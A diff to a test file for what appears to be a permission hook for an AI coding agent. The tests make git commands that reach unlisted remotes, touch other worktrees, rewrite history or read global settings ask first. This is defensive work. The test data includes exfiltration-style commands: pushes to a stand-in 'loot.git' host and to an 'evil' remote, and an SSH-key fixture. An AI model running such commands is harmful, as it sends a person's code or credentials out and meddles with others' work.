@@ -25,6 +25,9 @@ before(() => {
   for (const f of ['/test.mjs', '/src/existing.js', '/README.md', '/nb.ipynb', '/reporter.mjs', '/setup.mjs', '/.claude/settings.json', '/.claude/x.mjs', '/list.txt']) fs.writeFileSync(cwd + f, 'x\n');
   fs.writeFileSync(outside + '/evil.mjs', '');
   fs.writeFileSync(outside + '/shared.txt', '');
+  // The repository's own remotes: a plain push or fetch to one of them runs.
+  fs.writeFileSync(cwd + '/.git/config', '[core]\n\tbare = false\n[remote "origin"]\n\turl = https://github.com/owner/repo.git\n'
+    + '[remote "upstream"]\n\turl = https://github.com/other/repo.git\n');
   for (const f of ['/scratch/a.txt', `/cc/-proj-key/${SID}/tasks/b1.output`, `/cc/-proj-key/${OTHER}/secret.txt`, `/cc-x/-proj-key/${SID}/x.txt`,
     '/home/.ssh/id_ed25519', '/home/.zshrc']) fs.writeFileSync(T + f, 'x\n');
   fs.writeFileSync(worktree + '/.git', 'gitdir: /somewhere/.git/worktrees/x\n'); // a worktree's .git is a file
@@ -900,24 +903,21 @@ test('git commands that stay in the agent’s own folder run without asking', ()
     'git reset --hard', 'git reset --hard HEAD~1', 'git restore --staged .', 'git rm --cached README.md', 'git mv a.js b.js', 'git clean -fdx',
     'git stash', 'git stash push -m "work in progress"', 'git stash pop', 'git stash list', 'git stash drop', 'git tag v1.0',
     'git tag -a v1.0 -m "Release one"', 'git tag -d v0.9', 'git cherry-pick abc123', 'git revert HEAD --no-edit', 'git notes add -m "checked"',
-    'git bisect start', 'git bisect good HEAD~5', 'git gc', 'git maintenance run', 'git hook run pre-commit', 'git update-ref refs/heads/x HEAD',
-    // other computers, through git
-    'git fetch', 'git fetch origin', 'git fetch --all --prune', 'git pull', 'git pull --rebase origin main', 'git push', 'git push origin main',
-    'git push -u origin feature/login', 'git push origin HEAD:refs/heads/fix', 'git push --tags', 'git push origin v1.0', 'git push -n origin main',
-    'git push --no-force-with-lease origin main', 'git push -o ci.skip origin main', 'git push https://github.com/owner/repo.git main',
-    'git clone https://github.com/owner/repo.git', 'git clone git@github.com:owner/repo.git sub/repo', 'git clone --depth 1 -b main https://github.com/o/r',
-    'git remote add origin https://github.com/owner/repo.git', 'git remote set-url origin git@github.com:owner/repo.git', 'git remote -v',
-    'git ls-remote https://github.com/owner/repo', 'git submodule update --init --recursive', 'git submodule add https://github.com/o/lib libs/lib',
+    'git bisect start', 'git bisect good HEAD~5', 'git gc', 'git hook run pre-commit', 'git update-ref refs/heads/x HEAD',
+    // other computers, through the repository's own remotes (its settings name origin and upstream)
+    'git fetch', 'git fetch origin', 'git fetch upstream', 'git fetch --all --prune', 'git pull', 'git pull --rebase origin main', 'git push',
+    'git push origin main', 'git push -u origin feature/login', 'git push origin HEAD:refs/heads/fix', 'git push --tags', 'git push origin v1.0',
+    'git push -n origin main', 'git push --no-force-with-lease origin main', 'git push -o ci.skip origin main', 'git remote -v', 'git remote show origin',
+    'git ls-remote', 'git ls-remote origin', 'git submodule update',
     // more folders and files of its own
     'git worktree add wt', 'git worktree list', 'git init sub', 'git archive -o out.zip HEAD', 'git format-patch -1', 'git bundle create repo.bundle HEAD',
-    'git diff --output=x.patch', 'git show --outp=x', 'git apply list.txt',
+    'git diff --output=x.patch', 'git show --outp=x', 'git apply --check list.txt',
     // reading
     'git status', 'git log --oneline -5', 'git shortlog -sn', 'git describe --tags', 'git ls-tree HEAD', 'git cat-file -p HEAD', 'git log --grep=/api',
     'git reflog', 'git version', 'git --version', 'git help commit',
-    // git's settings, read
-    'git config user.name', 'git config --get user.name', 'git config --global --get user.email', 'git config --list', 'git config -l',
-    'git config --list --show-origin', 'git config get user.name', 'git config --get-urlmatch http.proxy https://github.com',
-    'git config -f .gitmodules --get-regexp path',
+    // git's settings, read one by one or the repository's own
+    'git config user.name', 'git config --get user.name', 'git config --local --list', 'git config get user.name',
+    'git config --get-urlmatch http.proxy https://github.com', 'git config -f .gitmodules --get-regexp path',
     // -C inside the folder, and options that change nothing about where git works
     'git -C src status', 'git -C src log --oneline', 'git -C src -C .. status', "git -C '' status", 'git --no-pager -C src diff', 'git -P log',
     'git --no-optional-locks status',
@@ -929,8 +929,13 @@ test("a git message or web address names no place, so it never makes git ask", (
     'git commit -m "/api/users answers 404 now"', 'git commit -am "See https://example.com/a/b for the bug"', 'git commit -m"/x y"',
     'git commit --message="/api fix"', 'git commit --message "/api fix"', 'git tag -a v1 -m "/release"', 'git merge -m "/merge" feature',
     'git stash push -m "/wip"', 'git notes add -m "https://example.com/review"', 'git commit-tree HEAD -m "/x"',
-    'git clone https://github.com/owner/repo.git', 'git remote add upstream ssh://git@example.com/srv/repo.git',
   ].map(c => bash(c)), 'allow');
+  // A web address is not a place in the folder either: these ask only because they reach another repository.
+  for (const command of ['git clone https://github.com/owner/repo.git', 'git remote add upstream ssh://git@example.com/srv/repo.git']) {
+    const d = decide({ cwd, ...bash(command) });
+    assert.equal(d.decision, 'ask', command);
+    assert.match(d.reason, /not one of the repository's own remotes/, command);
+  }
   // The same words where they could be a place git writes still ask.
   check(['git merge -sm /tmp/x feature', 'git commit -F /tmp/msg', 'git clone https://github.com/o/r /tmp/r'].map(c => bash(c)), 'ask');
 });
@@ -946,8 +951,9 @@ test('a web address is still checked as a whole, as the path it would also be fr
   } finally {
     fs.rmSync(cwd + '/https:');
   }
-  check(['git clone https://github.com/owner/repo.git', 'git push https://github.com/owner/repo.git main',
-    'git ls-remote https://github.com/owner/repo'].map(c => bash(c)), 'allow');
+  // Without such a link the address names no place in the folder: these ask only because they reach another repository.
+  asksBecause(['git clone https://github.com/owner/repo.git', 'git push https://github.com/owner/repo.git main',
+    'git ls-remote https://github.com/owner/repo'].map(c => bash(c)), /not one of the repository's own remotes/);
 });
 
 test("git still asks before it writes git's settings, which can make git run other programs", () => {
@@ -1015,7 +1021,9 @@ test('a push that replaces or deletes what is on the remote asks; a plain push o
   asksBecause(['git remote add --mirror=push backup https://github.com/owner/repo.git', 'git remote add --mirror backup https://github.com/owner/repo.git',
     'git remote add --mirr=push backup ../x.git', 'git clone --mirror https://github.com/owner/repo.git', 'git clone --mirror https://github.com/owner/repo.git copy.git',
   ].map(c => bash(c)), /mirror of a remote: every later push/);
-  check(['git remote add --mirror=fetch backup https://github.com/owner/repo.git', 'git clone --bare https://github.com/owner/repo.git copy.git'].map(c => bash(c)), 'allow');
+  // A fetch mirror or a bare copy sets up no push mirror: they ask only because they reach another repository.
+  asksBecause(['git remote add --mirror=fetch backup https://github.com/owner/repo.git', 'git clone --bare https://github.com/owner/repo.git copy.git'].map(c => bash(c)),
+    /not one of the repository's own remotes/);
 });
 
 test('a git command that names a place outside the folder asks, even where nothing is there yet', () => {
@@ -1216,6 +1224,123 @@ test('git asks before it destroys what no fetch can bring back; the rest of git 
   check(['git branch -D workbench/work', 'git branch -d workbench/work', 'git gc', 'git gc --aggressive', 'git gc --no-prune', 'git reflog',
     'git reflog show main', 'git reflog list', 'git reflog exists main', 'git update-ref refs/heads/x HEAD', 'git update-ref -m delete refs/heads/x HEAD',
     'git update-ref refs/heads/x HEAD 1111111111111111111111111111111111111111', 'git tag -d v0.9', 'git stash drop', 'git branch -udevelop',
-    'git branch -m new', 'git branch feature', 'git branch -d', 'git worktree add wt', 'git worktree list', 'git prune-packed',
+    'git branch -m new', 'git branch feature', 'git branch -d', 'git worktree add wt', 'git worktree list',
   ].map(c => bash(c)), 'allow');
+});
+
+// ---------------------------------------------------------------------------------------------
+// git that reaches past the agent's own work: hardening for the public release
+
+test("git worktree move, lock, unlock and repair ask: git finds a working copy by the end of its path, so it could be another agent's", () => {
+  const rows = [
+    ['git worktree move other-agent stolen', 'wants to move another working copy of the repository'],
+    ['git worktree move --force other-agent stolen', 'wants to move another working copy of the repository'],
+    ['git worktree lock other-agent', 'wants to lock another working copy of the repository'],
+    ['git worktree lock --reason "mine now" other-agent', 'wants to lock another working copy of the repository'],
+    ['git worktree unlock other-agent', 'wants to unlock another working copy of the repository'],
+    ['git worktree repair', "wants to repair git's records of other working copies"],
+    ['git worktree repair other-agent', "wants to repair git's records of other working copies"],
+  ];
+  for (const [command, sentence] of rows) {
+    const d = decide({ cwd, ...bash(command) });
+    assert.deepEqual([d.decision, d.sentence], ['ask', sentence], command);
+    assert.match(d.reason, /another working copy of the repository/, command);
+  }
+  check(['git worktree list', 'git worktree add wt', 'git worktree add -b topic wt2'].map(c => bash(c)), 'allow');
+});
+
+test("git replace asks: it changes what every working copy shows for a commit, the person's own included", () => {
+  asksBecause(['git replace abc123 def456', 'git replace -f abc123 def456', 'git replace --edit abc123', 'git replace --graft abc123 def456',
+    'git replace -d abc123', 'git replace --delete abc123', 'git replace --convert-graft-file', 'git replace --raw --edit abc123', 'git replace --gr abc123',
+    // the same, by other means: writing a name under refs/replace directly, or fetching one
+    'git update-ref refs/replace/abc123 def456', 'git update-ref --no-deref refs/replace/abc123 def456', 'git symbolic-ref refs/replace/abc123 refs/heads/x',
+    "git fetch origin 'refs/replace/*:refs/replace/*'", "git fetch origin '+refs/*:refs/*'", 'git fetch origin abc:refs/replace/abc',
+    "git pull origin 'refs/replace/*:refs/replace/*'",
+  ].map(c => bash(c)), /show other commits in place of the ones it has/);
+  assert.equal(decide({ cwd, ...bash('git replace abc123 def456') }).sentence, 'wants to make git show a different commit in place of another');
+  check(['git replace', 'git replace -l', "git replace --list 'abc*'", 'git replace --format=medium', 'git replace -l --format=long',
+    'git update-ref refs/heads/x HEAD', 'git fetch origin main:refs/remotes/origin/main', 'git fetch origin main'].map(c => bash(c)), 'allow');
+});
+
+test('git asks before upkeep that can delete work no branch holds for good: maintenance run, repack -d, prune-packed', () => {
+  asksBecause(['git maintenance run', 'git maintenance run --task=gc', 'git maintenance run --task=loose-objects', 'git maintenance run --auto',
+    'git maintenance run --task=incremental-repack --quiet', 'git repack -d', 'git repack -a -d', 'git repack -ad', 'git repack -Ad', 'git repack -adf --depth=50',
+    'git repack -d -l', 'git prune-packed', 'git prune-packed -n'].map(c => bash(c)), /can delete work that no branch holds/);
+  assert.equal(decide({ cwd, ...bash('git repack -a -d') }).sentence, "wants to tidy git's records, which can delete work that no branch holds");
+  check(['git gc', 'git gc --aggressive', 'git repack', 'git repack -a', 'git repack -A -l', 'git count-objects -v', 'git maintenance'].map(c => bash(c)), 'allow');
+});
+
+test("git that names an address or a folder instead of one of the repository's own remotes asks: it would reach it with the person's saved sign-in", () => {
+  asksBecause(['git fetch https://github.com/owner/repo.git', 'git fetch http://127.0.0.1:9/private.git main', 'git fetch git@github.com:owner/repo.git',
+    'git fetch github.com:owner/repo', 'git fetch .', 'git fetch elsewhere', 'git fetch --multiple origin elsewhere', 'git fetch --depth 1 https://x.example/r.git',
+    'git fetch origin https://x.example/r.git', 'git pull https://x.example/r.git main', 'git pull . main', 'git push https://github.com/owner/repo.git main',
+    'git push --repo=https://x.example/r.git', 'git push --repo https://x.example/r.git', 'git push elsewhere main', 'git push -o ci.skip https://x.example/r.git main',
+    'git push http://127.0.0.1:9/loot.git FETCH_HEAD:refs/heads/theirs', 'git ls-remote https://github.com/owner/repo', 'git ls-remote --sort=v:refname https://x.example/r',
+    'git ls-remote elsewhere', 'git clone https://github.com/owner/repo.git', 'git clone git@github.com:owner/repo.git sub/repo', 'git clone --depth 1 -b main https://github.com/o/r',
+    'git clone sub copy', 'git archive --remote=https://x.example/r.git HEAD', 'git archive --remote https://x.example/r.git HEAD', 'git archive --remote=elsewhere HEAD',
+    'git submodule add https://github.com/o/lib libs/lib', 'git submodule add ./lib libs/lib', 'git submodule init', 'git submodule sync', 'git submodule update --init',
+    'git submodule update --init --recursive', 'git submodule set-url libs/lib https://x.example/r.git', 'git remote add evil https://x.example/r.git',
+    'git remote add upstream2 ssh://git@example.com/srv/repo.git', 'git remote set-url origin https://x.example/r.git', 'git remote set-url --push origin https://x.example/r.git',
+    'git remote show https://x.example/r.git', 'git request-pull v1.0 https://x.example/r.git main', 'git send-pack https://x.example/r.git main', 'git fetch-pack https://x.example/r.git',
+    // An option's value is never taken for the repository, nor the repository for a value: git takes a whole option name over an abbreviation.
+    'git fetch --recurse-submodules evil.example:repo', 'git fetch -j 4 evil.example:repo', 'git push --recurse-submodules check evil.example:repo main',
+  ].map(c => bash(c)), /not one of the repository's own remotes/);
+  const say = command => decide({ cwd, ...bash(command) }).sentence;
+  assert.equal(say('git fetch http://127.0.0.1:9/private.git main'), 'wants to download new commits from 127.0.0.1');
+  assert.equal(say('git push https://github.com/owner/repo.git main'), 'wants to push main to GitHub');
+  assert.equal(say('git clone https://github.com/owner/repo.git'), 'wants to download owner/repo from GitHub');
+  assert.equal(say('git ls-remote https://github.com/owner/repo'), 'wants to reach another repository');
+  assert.equal(say('git remote add evil https://x.example/r.git'), 'wants to add a remote');
+  assert.equal(say('git remote set-url origin https://x.example/r.git'), 'wants to change where a remote points');
+  assert.equal(say('git submodule update --init'), 'wants to download submodules from the addresses in .gitmodules');
+  // The repository's own remotes, by the names its settings give them, still run, as does git with no remote named.
+  check(['git fetch', 'git fetch origin', 'git fetch origin main', 'git fetch upstream', 'git fetch --all --prune', 'git fetch --multiple origin upstream',
+    'git fetch --depth 1 origin main', 'git fetch -j 4 origin', 'git fetch --recurse-submodules origin', 'git fetch --recurse-submodules-default on-demand origin',
+    'git pull', 'git pull --rebase origin main', 'git pull -X theirs origin main', 'git push --recurse-submodules check origin main', 'git push',
+    'git push origin main', 'git push -u origin feature/login', 'git push --repo=origin', 'git push -o ci.skip origin main', 'git push origin HEAD:refs/heads/fix',
+    'git ls-remote', 'git ls-remote origin', 'git ls-remote --heads origin', 'git remote -v', 'git remote show origin', 'git remote prune origin', 'git remote update',
+    'git submodule update', 'git submodule status',
+  ].map(c => bash(c)), 'allow');
+});
+
+test("a remote is the repository's own when the settings in its records name it, also from a worktree, whose records are in the main repository", () => {
+  const main = T + '/wtmain';
+  const wt = T + '/wt-agent';
+  fs.mkdirSync(main + '/.git/worktrees/wt-agent', { recursive: true });
+  fs.mkdirSync(main + '/.git/remotes', { recursive: true });
+  fs.mkdirSync(wt, { recursive: true });
+  fs.writeFileSync(main + '/.git/config', '[core]\n\tbare = false\n[remote "fork"]\n\turl = https://github.com/me/repo.git\n'
+    + '  [Remote "my-fork.2"] url = https://github.com/me/two.git\n# [remote "commented"]\n');
+  fs.writeFileSync(main + '/.git/remotes/legacy', 'URL: https://example.com/old.git\n'); // the oldest way git keeps a remote
+  fs.writeFileSync(main + '/.git/worktrees/wt-agent/commondir', '../..\n');
+  fs.writeFileSync(wt + '/.git', `gitdir: ${main}/.git/worktrees/wt-agent\n`);
+  try {
+    check(['git push fork main', 'git fetch legacy', 'git push my-fork.2 main'].map(c => ({ ...bash(c), cwd: wt })), 'allow');
+    check(['git push commented main'].map(c => ({ ...bash(c), cwd: wt })), 'ask');
+    check(['git push origin main', 'git fetch upstream', 'git push forks main'].map(c => ({ ...bash(c), cwd: wt })), 'ask');
+  } finally {
+    fs.rmSync(main, { recursive: true, force: true });
+    fs.rmSync(wt, { recursive: true, force: true });
+  }
+});
+
+test("git apply and git am ask: a patch can write any file in the folder, links and Claude Code's own settings included", () => {
+  asksBecause(['git apply x.patch', 'git apply --index x.patch', 'git apply --cached x.patch', 'git apply -R x.patch', 'git apply --3way x.patch', 'git apply',
+    'git apply --check --apply x.patch', 'git apply --stat --apply x.patch', 'git apply -v x.patch', 'git am x.mbox', 'git am --continue', 'git am --skip',
+    'git am --abort', 'git am'].map(c => bash(c)), /patch can change any file/);
+  assert.equal(decide({ cwd, ...bash('git apply x.patch') }).sentence, 'wants to apply a patch to its files');
+  check(['git apply --check x.patch', 'git apply --stat x.patch', 'git apply --numstat --summary x.patch', 'git am --show-current-patch',
+    'git am --show-current-patch=diff'].map(c => bash(c)), 'allow');
+});
+
+test("git config asks before it reads git's settings from outside the agent's folder: the person's own, the computer's, or a list across them", () => {
+  asksBecause(['git config --global --list', 'git config --global --get user.email', 'git config --global user.email', 'git config --system --list',
+    'git config --gl -l', 'git config --list', 'git config -l', 'git config -lz', 'git config --list --show-origin', 'git config --show-origin user.name',
+    'git config --show-scope --get user.name', 'git config --get-regexp .', 'git config --get-regexp url', 'git config list', 'git config get --regexp url',
+    'git config --get-urlmatch http https://github.com', 'git config --local --includes --list', 'git var -l'].map(c => bash(c)),
+  /settings from outside the agent's own folder/);
+  assert.equal(decide({ cwd, ...bash('git config --global --list') }).sentence, "wants to read git's settings from outside its own folder");
+  check(['git config user.name', 'git config --get user.name', 'git config get user.name', 'git config --local --list', 'git config --list --local',
+    'git config --worktree --list', 'git config -f .gitmodules --get-regexp path', 'git config --file .gitmodules --list', 'git config --blob HEAD:.gitmodules --list',
+    'git config --get-urlmatch http.proxy https://github.com', 'git config --local --get-regexp remote', 'git var GIT_EDITOR'].map(c => bash(c)), 'allow');
 });
